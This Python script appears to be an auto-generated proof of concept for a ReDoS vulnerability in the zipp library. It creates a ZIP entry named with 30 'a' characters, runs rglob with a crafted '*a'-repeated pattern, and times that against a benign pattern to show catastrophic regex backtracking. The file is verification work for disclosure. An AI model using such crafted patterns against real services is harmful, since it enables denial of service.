#!/usr/bin/env python3
# PoC for zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c (/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c)
# Path: redos-002
# Sink: glob
# Auto-generated — run with: python3 redos_verifier_pattern_evidence_llm_glob_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept for ReDoS vulnerability in zipp (commit 45b7f675).
The vulnerability exists in the glob-to-regex translation performed by
the Translator class. When a malicious pattern containing multiple
wildcards (e.g., '*a' repeated many times) is matched against a
long ZIP entry name (e.g., many 'a' characters), the resulting regex
exhibits catastrophic backtracking, leading to a denial of service.

This script demonstrates the vulnerability by creating a malicious ZIP
file with a crafted entry name, then invoking `Path.rglob()` with an
attacker-controlled pattern. The time difference between a malicious
and benign pattern is printed.
"""

import sys
import os
import time
import tempfile
import zipfile
import shutil

# Adjust this path to the location of the vulnerable zipp library
ZIPP_SRC = "/tmp/bounty_test/zipp_src/zipp-45b7f675c0bcaa4f3f9d15b4399fc71e74f2408c"

# Ensure the zipp library is importable
sys.path.insert(0, ZIPP_SRC)

try:
    import zipp
except ImportError:
    print(f"Error: Could not import zipp from {ZIPP_SRC}.")
    print("Please update the ZIPP_SRC variable in the script to the correct path.")
    sys.exit(1)


def create_malicious_zip(zip_path, num_a=30):
    """
    Create a temporary ZIP file containing a single entry whose filename
    consists of many 'a' characters. This entry will be used to trigger
    catastrophic backtracking when matched with a pattern containing many '*a' groups.
    """
    filename = "a" * num_a  # e.g., 30 'a's
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        # Write a dummy file with the long name (content is irrelevant)
        zf.writestr(filename, "benign content")
    return filename


def measure_time(zip_path, pattern):
    """
    Measure the time taken by zipp.Path.rglob(pattern) on the given ZIP.
    Returns the elapsed time in seconds.
    """
    start = time.perf_counter()
    # Use rglob on the root of the ZIP file (pattern is attacker-controlled)
    with zipp.Path(zip_path) as zpath:
        # rglob with the provided pattern
        list(zpath.rglob(pattern))  # force iteration to trigger fullmatch
    elapsed = time.perf_counter() - start
    return elapsed


def main():
    print("=== ReDoS PoC for zipp library ===\n")

    # Create a temporary directory to hold the malicious ZIP
    temp_dir = tempfile.mkdtemp(prefix="zipp_poc_")
    zip_path = os.path.join(temp_dir, "malicious.zip")

    try:
        # 1. Create the malicious ZIP with many 'a's in the entry name
        entry_name = create_malicious_zip(zip_path, num_a=30)
        print(f"[+] Created malicious ZIP: {zip_path}")
        print(f"[+] Entry name: {entry_name!r} (30 characters)")

        # 2. Define the malicious pattern: many '*a' groups
        #    Each '*a' becomes '[^/]*a' in the regex, causing exponential backtracking.
        num_groups = 20  # adjust for visible effect (>= 15 should show slowdown)
        malicious_pattern = "*a" * num_groups
        print(f"[+] Malicious pattern: {malicious_pattern!r} (20 groups)")

        # 3. Define a benign pattern for comparison (single wildcard)
        benign_pattern = "*"
        print(f"[+] Benign pattern: {benign_pattern!r}")

        # 4. Measure time for malicious pattern
        print("\n[*] Measuring time for malicious pattern...")
        t_malicious = measure_time(zip_path, malicious_pattern)
        print(f"    Time: {t_malicious:.4f} seconds")

        # 5. Measure time for benign pattern
        print("[*] Measuring time for benign pattern...")
        t_benign = measure_time(zip_path, benign_pattern)
        print(f"    Time: {t_benign:.4f} seconds")

        # 6. Compare results
        print("\n=== Results ===")
        print(f"Malicious pattern time: {t_malicious:.4f}s")
        print(f"Benign pattern time:    {t_benign:.4f}s")

        # A factor > 10 clearly indicates ReDoS
        if t_malicious > 10 * t_benign:
            print("\n[!] Vulnerability confirmed: Malicious pattern caused significant delay.")
        else:
            print("\n[*] No significant delay observed. Try increasing `num_a` or `num_groups`.")

    finally:
        # Clean up temporary files
        shutil.rmtree(temp_dir, ignore_errors=True)
        print(f"\n[+] Cleaned up temporary directory {temp_dir}")


if __name__ == "__main__":
    main()
